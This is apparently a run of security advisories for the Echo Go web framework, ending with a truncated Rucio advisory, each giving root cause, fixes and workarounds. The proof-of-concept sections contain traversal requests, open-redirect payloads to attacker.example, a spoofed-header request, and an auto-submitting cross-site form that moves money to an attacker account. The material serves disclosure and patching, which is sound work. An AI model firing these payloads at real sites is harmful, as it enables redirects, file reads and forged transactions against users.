1. Extend the pre-unescape guard to reject encoded dot segments such as `%2E` and `%2E%2E` in path components.
2. After unescaping, reject any wildcard where cleaning changes the path in a way that removes `.` or `..` components.
3. For `UseEscapedPathForMatching=true`, run the static-file guard against the original escaped request path before router normalization, or preserve metadata that the matched wildcard came from encoded separators.

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The Static middleware and `StaticDirectoryHandler` (used by `Echo.Static`, `Echo.StaticFS`, `Group.Static` and `Group.StaticFS`) no longer serve paths with a `.`, `..` or empty segment, including after path unescaping. The encoded variant of the first vector (`/public/%2E%2E/admin/secret.txt`) was already fixed in v5.2.1 and v4.15.4 (GHSA-vfp3-v2gw-7wfq).

## Workarounds

Put a reverse proxy in front of the application that normalizes request paths (removes dot segments and merges slashes), or keep protected files outside the served directory.

## Summary

Commit a9ede66a (PR #3006, issue #2599) silently fixed a path traversal vulnerability in the Echo web framework's static file middleware.

## Vulnerability

The static middleware double-unescaped URL paths. Go's net/http already decodes Request.URL.Path, but middleware/static.go unconditionally called url.PathUnescape() again:

```go
// BEFORE (vulnerable)
pathUnescape := true
```

This reassembled path traversal sequences from double-encoded input. An attacker could send GET /%2e%2e%2fsecret.txt or /..%252fsecret.txt and the double-unescape would produce ../secret.txt.

## Fix
```go
// AFTER (fixed)
pathUnescape := false
```

The commit's test TestStatic_percentEncodedTraversalIsBlocked explicitly verifies traversal vectors are blocked.

## Impact
Arbitrary file read from server filesystem via percent-encoded path traversal.

## References
- Fix: https://github.com/labstack/echo/commit/a9ede66a
- Issue: https://github.com/labstack/echo/issues/2599
- PR: https://github.com/labstack/echo/pull/3006

## Patches

Fixed in `github.com/labstack/echo/v5` v5.2.0 and `github.com/labstack/echo/v4` v4.15.3, where the Static middleware stopped unescaping an already decoded path. cves.summary:
## Summary

Echo's dedicated open-redirect guard, `sanitizeURI`, decides whether a redirect target is a local path by inspecting exactly two byte positions: `uri[0]` and `uri[1]`. If the value begins with a control character such as a tab or a newline, followed by a separator pair, the guard does not fire and the value is written to the `Location` header unchanged.

Browsers remove tab and newline characters from URLs before parsing them, and treat a backslash as a forward slash for HTTP and HTTPS URLs. A `Location` value of ``/\t/attacker.example`` is therefore resolved by the browser as an absolute URL on `attacker.example`. Confirmed end to end in a headless browser.

## Technical background

### The guard

`middleware/slash.go:144` (duplicated verbatim at `echo.go:958`):

```go
func sanitizeURI(uri string) string {
	// double slash `\\`, `//` or even `\/` is absolute uri for browsers and by redirecting request to that uri
	// we are vulnerable to open redirect attack. so replace all slashes from the beginning with single slash
	if len(uri) > 1 && (uri[0] == '\\' || uri[0] == '/') && (uri[1] == '\\' || uri[1] == '/') {
		uri = "/" + strings.TrimLeft(uri, `/\`)
	}
	return uri
}
```

The condition is anchored at absolute offsets 0 and 1. It cannot see a separator that has been shifted by one byte.

### Data flow

1. `RemoveTrailingSlash` (`middleware/slash.go:112-140`) reads `url.Path`, which `net/http` has already percent-decoded, strips the trailing slash, and appends the raw query string:

```go
path := url.Path
...
if l > 0 && strings.HasSuffix(path, "/") {
    path = path[:l]
    uri := path
    if qs != "" {
        uri += "?" + qs
    }
    if config.RedirectCode != 0 {
        return c.Redirect(config.RedirectCode, sanitizeURI(uri))   // line 132
    }
```

2. `AddTrailingSlash` does the same in the opposite direction at `middleware/slash.go:67`.

3. A request for `/%09/attacker.example/x/` has `url.Path` equal to `"/\t/attacker.example/x/"` (a literal TAB byte). `sanitizeURI` evaluates `uri[0] == '\t'`, the condition is false, and the value passes through untouched.

4. `Context.Redirect` (`context.go:735`) writes it to the `Location` header. Go's header writer removes CR and LF but leaves TAB, which is all that is required.

### Conditional analysis

- Guard: `uri[0]` and `uri[1]` are separators. Trust boundary: server-side sanitization of attacker-influenced path data.
- Bypass: place a single control byte before the separator pair. The separator moves to index 1 and the guard's second condition (`uri[1]` being a separator) is never reached because the first condition (`uri[0]` being a separator) already failed.
- Browser-side trust boundary: the client's URL parser. It is adversary favourable: control characters are stripped and backslashes are normalized before scheme and authority parsing. The attacker does not need any server-side weakness beyond producing the malformed `Location`.

Note that the newline variant does not survive: `net/http` replaces CR and LF in header values. TAB does survive, and TAB alone is sufficient because the browser strips it.

## Proof of concept

**Attached PoC:** `ECHO-2026-002_poc.zip` (in this directory). Extract it and follow
`ECHO-2026-002/README.md` for the full walkthrough. The archive contains a
self-contained Go module (`go.mod`, `go.sum`, `main.go`, `README.md`).

[ECHO-2026-002_poc.zip](https://github.com/user-attachments/files/32133975/ECHO-2026-002_poc.zip)

Quick start:

```bash
unzip ECHO-2026-002_poc.zip
cd ECHO-2026-002
# edit go.mod: point the replace directive at your Echo checkout
sed -i 's|=> .*|=> /absolute/path/to/echo|' go.mod
GOFLAGS=-mod=mod go run .          # in-process check
GOFLAGS=-mod=mod go run . -serve   # real listener on 127.0.0.1:18002
```

### Environment used for verification

- OS: Linux 6.18.33.2-microsoft-standard-WSL2, x86_64
- Go: go1.27.0 linux/amd64
- Target: Echo v5.3.1 (module `github.com/labstack/echo/v5`)
- Browser: headless Chromium drove the end-to-end confirmation

### The vulnerable configuration

```go
package main

import (
    "net/http"

    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    e.Pre(middleware.RemoveTrailingSlashWithConfig(middleware.RemoveTrailingSlashConfig{
        RedirectCode: http.StatusMovedPermanently,
    }))
    e.GET("/", func(c *echo.Context) error { return c.String(200, "home") })
    _ = e.Start("127.0.0.1:18002")
}
```

***

### Reproduction

In-process check. The program requests five path shapes and applies the browser
URL-parsing steps that matter (strip TAB, LF, CR; treat a backslash as a slash; a
leading `//` starts an authority):

```bash
GOFLAGS=-mod=mod go run .
```

```
GET                          code   Location (control chars shown) browser navigates to
/normal/path/                301    /normal/path           (victim origin)
                             control: ordinary path, sanitized correctly
/%09/attacker.example/x/     301    /^I/attacker.example/x attacker.example
                             exploit: TAB then slash
/%09%5Cattacker.example/x/   301    /^I\attacker.example/x attacker.example
                             exploit: TAB then backslash
/..%09/attacker.example/     301    /..^I/attacker.example (victim origin)
                             NOT exploitable: TAB is not at index 1
/%09//attacker.example/      301    /^I//attacker.example  (victim origin)
                             NOT exploitable: three slashes is an empty authority

RESULT: reproducible. ...
```

`^I` is a literal TAB byte. The last two rows are deliberate negatives, included
so the mechanism (the guard reads only `uri[0]` and `uri[1]`) is unambiguous.

Over the wire, with the `-serve` variant running on `127.0.0.1:18002`:

1. Show the malformed `Location` on the wire. No backslash is needed for this variant:

```bash
curl -s -i --max-time 5 'http://127.0.0.1:18002/%09/attacker.example/x/' | cat -A | head -3
# HTTP/1.1 301 Moved Permanently
# Location: /^I/attacker.example/x
```

`cat -A` renders the tab as `^I`, confirming it is a literal byte in the header.

2. Show that LF does NOT work, which proves the mechanism is the guard's fixed
   byte offsets rather than generic header injection:

```bash
curl -s -i --max-time 5 'http://127.0.0.1:18002/%0A/attacker.example/x/' | cat -A | head -3
# Location: / /attacker.example/x     (net/http rewrote LF to a space)
```

3. Confirm a browser leaves the origin. Start any HTTP server on port 18099, then
   open this URL in a browser:

```
http://127.0.0.1:18002/%09/127.0.0.1:18099/x/
```

Observed in headless Chromium:

```
finalUrl: http://127.0.0.1:18099/x
```

The browser left the victim origin entirely, so this is a working open redirect,
not merely a suspicious header.

Exit status `0` means the finding reproduced; `1` means an expectation was
violated.

## Impact

An attacker can craft a link on the victim domain that redirects the victim to an arbitrary external site. Practical consequences:

- Phishing: the trusted domain name appears in the link and in the initial navigation, which defeats the usual "check the domain" advice.
- OAuth and SSO token theft: any flow that permits a redirect target on the trusted origin and relies on that origin's redirects being local can be chained to leak authorization codes or access tokens.
- Referrer and cache poisoning of downstream logic that treats the victim origin's redirects as trustworthy.

The client must follow the redirect (user interaction is required), which is why this is scored Medium rather than High, but open redirects on authentication-adjacent origins routinely escalate in practice.

## Recommended fixes

Normalize before deciding, instead of probing two fixed offsets.

```go
func sanitizeURI(uri string) string {
	// Strip control characters that browsers remove before parsing, so they cannot
	// be used to shift a separator out of the checked positions.
	uri = strings.Map(func(r rune) rune {
		if r < 0x20 || r == 0x7f {
			return -1
		}
		return r
	}, uri)
	// Collapse any leading separator run (both slash kinds) to a single slash.
	if strings.ContainsAny(uri[:min(len(uri), 1)], `/\`) {
		trimmed := strings.TrimLeft(uri, `/\`)
		if len(trimmed) != len(uri) {
			return "/" + trimmed
		}
	}
	return uri
}
```

Additional hardening:

1. Reject the request with 400 when the decoded path contains control characters, rather than attempting to sanitize. A path containing a raw TAB or NUL is malformed under RFC 3986 and has no legitimate use.
2. Apply the same normalization to the `Location` value in `Context.Redirect` so every caller benefits, instead of relying on each call site to call `sanitizeURI`.
3. Add a regression test for each variant (`%09/`, `%09%5C`, `%0A/`) against both trailing-slash middlewares. There is currently no test that asserts `sanitizeURI` behavior at all.

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The trailing slash middlewares and the static directory redirect percent-encode control characters in the redirect path before collapsing leading slashes, so a browser can no longer be sent to another host.

## Workarounds

Use the trailing slash middlewares without `RedirectCode` (the default rewrites the path internally instead of redirecting), or reject request paths that contain control characters before these middlewares.

## Summary

The `c.Scheme()` method in Echo (`context.go:162-181`) trusts the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, and `X-Url-Scheme` request headers without validating that the value is `http` or `https`. The `WWWRedirect()` and `NonWWWRedirect()` middlewares use this unsanitized scheme to construct redirect URLs, allowing an attacker to inject arbitrary URI schemes into the `Location` response header.

## Affected Components

- `context.go:162-181` - `Scheme()` method returns attacker-controlled value verbatim
- `middleware/redirect.go:172-184` - `redirectWWW`/`redirectNonWWW` use unsanitized scheme

## Proof of Concept

```
GET /path HTTP/1.1
Host: example.com
X-Forwarded-Proto: javascript

Response:
HTTP/1.1 301 Moved Permanently
Location: javascript://www.example.com/path
```

Confirmed injectable schemes: `javascript`, `data`, `vbscript`, `file`, `ftp`, `ssh`, `telnet`, `gopher`.

Only `WWWRedirect()` and `NonWWWRedirect()` (and `WithConfig` variants) are affected. `HTTPSRedirect`, `HTTPSWWWRedirect`, `HTTPSNonWWWRedirect` are NOT affected (they hardcode `https://`).

## Impact

- Open redirect to arbitrary scheme URLs when app is not behind a proxy that strips `X-Forwarded-Proto`
- Cache poisoning when behind a CDN that caches redirect responses keyed by path
- `file://` scheme injection could trigger file access in some browser configurations

## Suggested Fix

Whitelist scheme in `c.Scheme()` to only return `http` or `https`:

```go
func (c *Context) Scheme() string {
    if c.IsTLS() {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != "" {
        scheme = strings.ToLower(strings.TrimSpace(scheme))
        if scheme == "https" {
            return "https"
        }
    }
    return "http"
}
```

## Disclosure

Source code review, manually verified with actual HTTP server. Tested on Echo v5.0.4 (latest master).

## Patches

Fixed in `github.com/labstack/echo/v5` v5.1.1 and `github.com/labstack/echo/v4` v4.15.2. `Context.Scheme()` now accepts only `http`, `https`, `ws` or `wss` from the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` headers, and falls back to `http` for any other value (#2953).

## Workarounds

Upgrade to a patched version. If you cannot upgrade, have your edge proxy overwrite or remove the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` request headers.

## Summary

When `middleware.Static` is mounted globally (`e.Use(middleware.Static(...))`) and an application relies on a **route- or group-level middleware guard** to restrict a path that also falls under the served static root, a `%2F`-encoded request bypasses that guard while the file is still served. This is the same encoding/decoding mismatch fixed for `StaticFS`/`StaticDirectoryHandler` in CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq, but the fix did not cover the `middleware.Static` path. In addition, the `StaticConfig.EnablePathUnescaping` docstring states the default configuration prevents exactly this bypass, which is inaccurate for the global-mount case.

**This is not path traversal:** no file outside the static root is accessed. The served file lives inside the static root; the issue is that access-control expectations set by a route guard are inconsistent between the literal and `%2F`-encoded forms of the same path.

## Details

Root cause — the router and the static handler disagree on how to interpret `%2F`:

- The router matches routes on the **raw, still-encoded** path, so `GET /admin%2Fsecret.txt` does **not** match a `/admin/...` route or group; any middleware attached to that route/group is therefore skipped.
- `middleware.Static` selects its path source in `middleware/static.go` (~L219): with a global `e.Use` mount there is no wildcard route, so it uses `c.Request().URL.Path`, which `net/http` has already **decoded** (`%2F` → `/`). It then `path.Clean`s (~L235) and `Open`s (~L259) `admin/secret.txt`, serving the file.

Net effect: for the literal path the guard runs; for the `%2F`-encoded path the guard is skipped but the same file is served.

Relevant code:
- `middleware/static.go` ~L219 (`p := c.Request().URL.Path`), ~L235 (`path.Clean`), ~L259 (`currentFS.Open`)
- `StaticConfig.EnablePathUnescaping` docstring (`static.go` ~L60-67) — claims the default prevents the `/admin%2fprivate.txt` → `/admin/*` guard bypass; this is not true for the global mount.

Relationship to prior advisories:
- **CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq** (patched 5.2.0): same `%2F` router-vs-handler mismatch, but fixed for `StaticFS`/`StaticDirectoryHandler`. The `middleware.Static` path was not covered — this report is that gap.
- **CVE-2026-25766 / GHSA-pgvm-wxw2-hrv9** (patched 5.0.3): a *different* issue (Windows backslash traversal **outside** the root). Referenced only to disambiguate; not the same as this report.

## PoC

Environment: `golang:1.25`, module using the official release (`go get github.com/labstack/echo/v5@v5.3.1`, no local `replace`). Static root `public/` contains a marker file `public/admin/secret.txt` = `SECRET`.

Minimal app (the pattern under test: static served globally + a group guard intended to protect `/admin`):

```go
package main

import (
	"net/http"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
)

func main() {
	e := echo.New()
	e.Use(middleware.Static("public")) // serves ./public globally (default filesystem)

	admin := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
		return func(c *echo.Context) error { return c.String(http.StatusUnauthorized, "auth required") }
	})
	admin.GET("/secret.txt", func(c *echo.Context) error { return c.String(http.StatusOK, "handler") })

	e.Start(":1323")
}
```

Requests (unauthenticated):

```
# Literal: route matches -> group guard runs
curl -i http://localhost:1323/admin/secret.txt
# => 401

# %2F-encoded: route does NOT match -> guard skipped, but middleware.Static serves the file
curl -i --path-as-is http://localhost:1323/admin%2Fsecret.txt
# => 200, body: SECRET
```

Observed on `v5.3.1`: literal → `401`; `%2F` → `200` with the file contents. For contrast, serving via the (patched) `e.StaticFS("/")` returns `404` for the same `%2F` request, showing the `middleware.Static` path was not covered by the CVE-2026-55677 fix.

## Impact

An unauthenticated remote user can retrieve a file served by `middleware.Static` even when the application attached a route/group middleware guard to that path, by substituting `/` with `%2F`. The consequence is limited to files already inside the served static root (CWE-863 authorization inconsistency; CWE-436 interpretation conflict) — **there is no access to files outside the static root**.

**Honest caveat on validity / severity:** this only has security impact for applications that (a) serve a directory statically to the public *and* (b) place a sensitive file inside that same directory while relying on a *route-level* guard to protect it. That combination is arguably a misconfiguration — a statically-served directory is public by design — so maintainers may reasonably classify this as a documentation fix (correct the `EnablePathUnescaping` claim) or won't-fix rather than a code vulnerability. It is filed primarily because (1) the router-vs-handler `%2F` inconsistency is the exact class fixed in CVE-2026-55677 but left uncovered for `middleware.Static`, and (2) the docstring currently promises protection it does not provide.

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. With the default settings, the Static middleware resolves files from the same form of the path that the router matched, so percent-encoded paths such as `/admin%2Fsecret.txt` or `/%61dmin/secret.txt` no longer reach a file under a guarded route. Paths with `.`, `..` or empty segments are no longer served.

Note: middleware registered with `Echo#Use` runs before route and group middleware, so route guards never protect files served by a global Static middleware. Keep protected files outside its root directory, or serve them with `Echo#Static` behind the guard.

## Workarounds

Keep files that need protection outside the Static middleware's root directory.

## Summary

The `MethodOverride` middleware accepts any non-empty string as the override target method — including safe methods (GET, HEAD, OPTIONS, TRACE) — when rewriting a POST request. When `MethodOverride` is registered before `CSRF` in the post-routing middleware chain (`e.Use()`), it rewrites the request method to a safe method before `CSRF` evaluates it. The CSRF middleware then skips token validation for the now-safe method, allowing state-changing POST handlers to execute without any CSRF check. Both the legacy token path and the modern `Sec-Fetch-Site` protection path are bypassed simultaneously.

## Affected Component

- `middleware/method_override.go` — `MethodOverrideConfig.ToMiddleware()` (lines 55–71): no whitelist on the override target method
- `middleware/csrf.go` — `CSRFConfig.ToMiddleware()` (lines 188–189): safe-method bypass branch reads the already-rewritten method
- `middleware/csrf.go` — `checkSecFetchSiteRequest()` (line 283): `Sec-Fetch-Site` safe check also reads the rewritten method

## Description

### MethodOverride accepts safe methods as override targets

`MethodOverrideConfig.ToMiddleware()` (`method_override.go:55-71`) restricts the **source** method (only POST requests are overrideable) but applies no whitelist to the **target**:

```go
// method_override.go:61-67
req := c.Request()
if req.Method == http.MethodPost {
    m := config.Getter(c)
    if m != "" {
        req.Method = m   // ← any non-empty string accepted, including "GET"
    }
}
```

The docstring's security claim — "For security reasons, only POST method can be overridden" — refers only to the source-method restriction. There is no guard preventing POST from being rewritten to `GET`, `HEAD`, `OPTIONS`, or `TRACE`. The test suite (`method_override_test.go`) only tests POST→DELETE and POST→PUT; POST→GET is never tested or blocked.

### CSRF safe-method branch reads the already-rewritten method

`CSRFConfig.ToMiddleware()` (`csrf.go:188-189`) makes its validation decision based on `c.Request().Method` at the time it runs:

```go
// csrf.go:188-189
switch c.Request().Method {
case http.MethodGet, http.MethodHead, http.MethodOptions, http.MethodTrace:
    // skip validation — no token check
default:
    // validate CSRF token
```

If MethodOverride has already run and set `req.Method = "GET"`, this `switch` falls into the skip branch regardless of the original HTTP method or what handler was matched.

The `Sec-Fetch-Site`-based path in `checkSecFetchSiteRequest()` (`csrf.go:283`) is identically vulnerable:

```go
// csrf.go:283
isSafe := slices.Contains(safeMethods, c.Request().Method)
```

With `req.Method = "GET"` (already rewritten), `isSafe = true` and the function returns `true` — the request is allowed even when `Sec-Fetch-Site` is `cross-site`. **Both** CSRF protection paths are bypassed in a single step.

### Execution chain

In `echo.go:700`, routing and middleware wrapping are performed in one step:

```go
h = applyMiddleware(e.router.Route(c), e.middleware...)
```

1. `e.router.Route(c)` evaluates with `req.Method = "POST"` → matches and binds the POST `/transfer` handler
2. `applyMiddleware` wraps it: `MethodOverride → CSRF → postHandler`

At request execution time:
3. **MethodOverride** runs: `req.Method == "POST"` → reads form field `_method` = `"GET"` → `req.Method = "GET"` → calls `next`
4. **CSRF** runs: `c.Request().Method` = `"GET"` → `case http.MethodGet` → **skips token validation** → calls `next`
5. **postHandler** runs (the handler matched in step 1 — the original POST `/transfer` state-change handler)

The state-changing handler executes with no CSRF token validation and with no `Sec-Fetch-Site` check.

### The missing target-method whitelist is the root cause

The legitimate use case for MethodOverride is allowing HTML forms (which only support GET/POST) to send PUT, DELETE, or PATCH requests. There is no legitimate scenario in which an HTML form needs to rewrite POST to GET — that can always be expressed as an ordinary GET request. Allowing POST→GET (and HEAD/OPTIONS/TRACE) serves no valid purpose and is inherently dangerous when any safe-method-aware security middleware (CSRF, logging, audit) appears downstream.

## Proof of Concept

```go
package main

import (
    "net/http"
    echo "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    // MethodOverride before CSRF �� both in e.Use() (post-routing)
    e.Use(middleware.MethodOverrideWithConfig(middleware.MethodOverrideConfig{
        Getter: middleware.MethodFromForm("_method"),
    }))
    e.Use(middleware.CSRF())
    e.POST("/transfer", func(c *echo.Context) error {
        return c.String(http.StatusOK, "transfer executed")
    })
    e.Logger.Fatal(e.Start(":18080"))
}
```

```bash
# Baseline — CSRF correctly blocks a POST without a valid token
curl -i -X POST 'http://127.0.0.1:18080/transfer' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'amount=100'
# HTTP/1.1 400 Bad Request (missing CSRF token)

# Bypass — _method=GET rewrites method before CSRF runs, skipping token validation
curl -i -X POST 'http://127.0.0.1:18080/transfer' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '_method=GET&amount=100'
# HTTP/1.1 200 OK
# transfer executed

# Browser-based CSRF PoC (attacker's page, auto-submits on load):
# <form method="POST" action="https://victim.example/transfer" id="f">
#   <input name="_method" value="GET">
#   <input name="amount" value="1000">
#   <input name="to" value="attacker_account">
# </form>
# <script>document.getElementById('f').submit();</script>
```

The same bypass works with `MethodFromHeader` (`X-HTTP-Method-Override: GET`) and `MethodFromQuery` (`?_method=GET`).

## Impact

- Any state-changing endpoint protected by `CSRF()` is reachable without a valid CSRF token when the vulnerable middleware ordering is present
- The `Sec-Fetch-Site` modern-browser CSRF protection is bypassed simultaneously — browsers that support `Sec-Fetch-Site` provide no additional defense
- Applicable attacks include: fund transfers, password/email changes, account deletion, privilege escalation, data manipulation — any POST-protected operation
- Audit logs may record `GET` as the HTTP method for what were actually state-changing operations

## Recommended Remediation

### Option 1: Whitelist only unsafe methods as override targets in `MethodOverride` (preferred)

The root cause is that MethodOverride accepts safe methods as targets. Restricting the override to legitimately overrideable methods (PUT, PATCH, DELETE) closes the bypass regardless of middleware ordering:

```go
// method_override.go — illustrative fix
var allowedOverrideMethods = map[string]bool{
    http.MethodPut:    true,
    http.MethodPatch:  true,
    http.MethodDelete: true,
}

// in ToMiddleware:
if req.Method == http.MethodPost {
    m := config.Getter(c)
    if m != "" && allowedOverrideMethods[m] {
        req.Method = m
    }
}
```

### Option 2: Use `e.Pre()` for `MethodOverride` and document the ordering requirement

Placing MethodOverride in `e.Pre()` (pre-routing middleware) causes the router to match the overridden method, not the original POST. If only POST `/transfer` is registered, a POST-to-GET override results in a 405/404 — the handler never executes. Add an explicit documentation warning that MethodOverride must not be placed in `e.Use()` when CSRF middleware is also registered:

```go
// MethodOverride returns a MethodOverride middleware.
//
// IMPORTANT: Register this middleware with e.Pre(), not e.Use().
// If registered with e.Use() before CSRF middleware, method rewriting
// occurs after route matching but before CSRF validation, allowing
// attackers to bypass CSRF token checks by specifying _method=GET.
func MethodOverride() echo.MiddlewareFunc {
```

Option 1 is strongly preferred as it closes the vulnerability at the source and is safe regardless of middleware placement.

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The MethodOverride middleware no longer overrides a POST to `GET`, `HEAD`, `OPTIONS`, `TRACE` or `CONNECT`.

## Workarounds

Register MethodOverride with `Echo#Pre` (as documented), register CSRF before MethodOverride, or use the default header getter (`X-HTTP-Method-Override`), which a cross-site form cannot set.

## Summary

The Echo proxy middleware (`middleware/proxy.go`) preserves an incoming `X-Real-IP` header verbatim and forwards it to the upstream service when `Echo#IPExtractor` is not configured — which is the default. Because any HTTP client can supply an arbitrary `X-Real-IP` value, an attacker can cause Echo to relay a spoofed client IP address to every upstream service behind the proxy, undermining upstream IP-based access controls, rate limiting, audit logging, and geo-restriction.

## Affected Component

- `middleware/proxy.go` — `ProxyConfig.ToMiddleware()`, header-rewriting block (lines 351–355)

## Description

### The header-preservation condition passes spoofed values to upstream

`ProxyConfig.ToMiddleware()` (`proxy.go:338-405`) prepares forwarding headers before dispatching each request. The `X-Real-IP` rewrite logic at lines 351-355 reads:

```go
// proxy.go:351-355
// Basically it's not good practice to unconditionally pass incoming x-real-ip header to upstream.
// However, for backward compatibility, legacy behavior is preserved unless you configure Echo#IPExtractor.
if req.Header.Get(echo.HeaderXRealIP) == "" || c.Echo().IPExtractor != nil {
    req.Header.Set(echo.HeaderXRealIP, c.RealIP())
}
```

The condition is `TRUE` (and therefore overwrites the header with a derived value) only when:
- The header is absent — `req.Header.Get(echo.HeaderXRealIP) == ""`; **or**
- `IPExtractor` is explicitly configured — `c.Echo().IPExtractor != nil`

The condition is `FALSE` — and the header is left **unchanged** — when the request arrives with an `X-Real-IP` header already set **and** `IPExtractor` is `nil`. Because `Echo.New()` leaves `IPExtractor` as `nil`, this is the out-of-the-box behaviour for every application that uses `Proxy()` or `ProxyWithConfig()` without extra configuration.

An attacker who sets `X-Real-IP` to any value causes Echo to forward exactly that value to the upstream, with no modification or validation.

### The comment in the source code confirms intent and the security gap

The inline comment at line 351-352 explicitly states:

> "Basically it's not good practice to unconditionally pass incoming x-real-ip header to upstream. However, for backward compatibility, legacy behavior is preserved unless you configure Echo#IPExtractor."

The framework is aware that the default is insecure and retains it for backward compatibility. No warning appears in the `Proxy()` or `ProxyWithConfig()` documentation, so operators who follow the standard setup example receive a silently insecure proxy configuration.

This is structurally identical to the documented insecurity in `ip.go:27`:

> "Note: if you don't set `Echo#IPExtractor` explicitly, Echo fallback to legacy behavior, which is not a good choice."

### Full execution chain

1. Attacker sends `GET /api/admin` to the Echo proxy with header `X-Real-IP: 203.0.113.1` (a trusted corporate IP)
2. `ToMiddleware()` evaluates the guard at line 353: header is present (`!= ""`), `IPExtractor` is `nil` → condition is `FALSE`
3. `req.Header.Set` is **not** called; the upstream request carries the original, attacker-supplied `X-Real-IP: 203.0.113.1`
4. Upstream service checks `X-Real-IP` against its IP allowlist → finds `203.0.113.1` → grants access
5. Attacker reaches an endpoint that should be restricted to the corporate IP range

Secondary impact path (audit poisoning):
- All upstream log entries, rate-limit counters, and geo-restriction checks are evaluated against `203.0.113.1` rather than the real client IP, rendering audit trails and security analytics unreliable.

## Proof of Concept

```go
package main

import (
    "fmt"
    "log"
    "net/http"
    echo "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    // Upstream server: echoes back the X-Real-IP it received
    upstream := http.NewServeMux()
    upstream.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "upstream sees X-Real-IP: %s\n", r.Header.Get("X-Real-IP"))
    })
    go http.ListenAndServe(":9000", upstream)

    // Echo proxy — IPExtractor deliberately NOT set (the default)
    e := echo.New()
    targets := []*middleware.ProxyTarget{{URL: mustParse("http://127.0.0.1:9000")}}
    e.Use(middleware.Proxy(middleware.NewRoundRobinBalancer(targets)))
    log.Fatal(e.Start(":1323"))
}
```

```bash
# Without spoofed header — upstream sees actual peer address
curl http://127.0.0.1:1323/
# upstream sees X-Real-IP: 127.0.0.1

# With spoofed header — upstream sees attacker-supplied value
curl -H 'X-Real-IP: 198.51.100.77' http://127.0.0.1:1323/
# upstream sees X-Real-IP: 198.51.100.77
```

The attacker-supplied IP `198.51.100.77` arrives at the upstream unchanged.

## Impact

- Upstream IP-based access controls (allowlists, blocklists, geo-restrictions) can be bypassed by supplying the expected IP in `X-Real-IP`
- Upstream rate limiters that key on `X-Real-IP` are bypassable (same class as the Echo rate-limiter finding, now on every upstream service)
- Audit logs, intrusion detection systems, and SIEM tools that rely on `X-Real-IP` record the attacker-chosen IP, not the real source — forensic trails are poisoned
- Any upstream admin endpoint restricted by IP allowlist is reachable by any attacker who knows or guesses a trusted IP address

## Recommended Remediation

### Option 1: Always overwrite `X-Real-IP` from an authoritative source (preferred)

Remove the conditional that preserves the incoming header. Echo, as the edge proxy, is the only authoritative source for the real client IP:

```go
// proxy.go — always set X-Real-IP from an authoritative source
req.Header.Set(echo.HeaderXRealIP, c.RealIP())
```

For this to be safe, operators using `Proxy()` should also configure `IPExtractor`:

```go
e.IPExtractor = echo.ExtractIPDirect() // no upstream proxy
// or
e.IPExtractor = echo.ExtractIPFromXFFHeader() // behind a trusted upstream LB
```

### Option 2: Document and warn in `Proxy()` godoc

If backward compatibility must be preserved, add a prominent security warning to `Proxy()` and `ProxyWithConfig()`:

```go
// Proxy returns a Proxy middleware.
//
// SECURITY: By default, an incoming X-Real-IP header supplied by the client
// is forwarded to the upstream unchanged. This allows any client to spoof its
// IP identity to upstream services. Configure Echo#IPExtractor before using
// this middleware to ensure X-Real-IP is derived from a trusted source:
//
//   e.IPExtractor = echo.ExtractIPDirect()
//
// See https://echo.labstack.com/guide/ip-address for details.
func Proxy(balancer ProxyBalancer) echo.MiddlewareFunc {
```

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0: the Proxy middleware always sets `X-Real-IP` from `Context.RealIP()`, which is the address of the direct peer unless `Echo#IPExtractor` is configured.

`github.com/labstack/echo/v4` is not changed, because v4's `Context.RealIP()` without `Echo#IPExtractor` trusts `X-Forwarded-For` and `X-Real-IP` by design, and changing that default would merge all clients behind a proxy into one rate-limit bucket.

## Workarounds

Configure `Echo#IPExtractor` for your deployment, for example `e.IPExtractor = echo.ExtractIPDirect()` when there is no proxy in front of the application, or `echo.ExtractIPFromXFFHeader()` / `echo.ExtractIPFromRealIPHeader()` (with `TrustIPRange` for proxies on public addresses). With an extractor set, the Proxy middleware overwrites `X-Real-IP` in v4 too.

cwe.name: Origin Validation Error

cves.summary:
## Summary
The `/credentials/signurl` endpoint decides authorization from the client-supplied `X-Rucio-Account` HTTP header instead of the authenticated token's account. Any client holding **any** valid auth token (even a low-privilege account they legitimately own) can send `X-Rucio-Account: root` to pass the root-only permission check and have the Rucio server mint a presigned **read / write / delete** URL for an **arbitrary** object, signed with the RSE's stored S3 / GCS / Swift credentials.

## Details
`SignURL.get()` takes the authorization principal from a request header and
never uses the token-authenticated identity:

```python
# lib/rucio/web/rest/flaskapi/v1/credentials.py
account = request.headers.get('X-Rucio-Account', default=None)     # L165  (attacker-controlled)
...
result = get_signed_url(account, rse=rse, service=service,         # L194
                        operation=operation, url=url, lifetime=lifetime, vo=vo)
```

The gateway then uses that header value as the `issuer` for the permission check:

```python
# lib/rucio/gateway/credential.py
auth_result = permission.has_permission(issuer=account, vo=vo,     # L57
                                        action='get_signed_url', kwargs=kwargs, ...)
```

and the permission function is root-only:

```python
# lib/rucio/core/permission/generic.py
def perm_get_signed_url(issuer, kwargs, session):
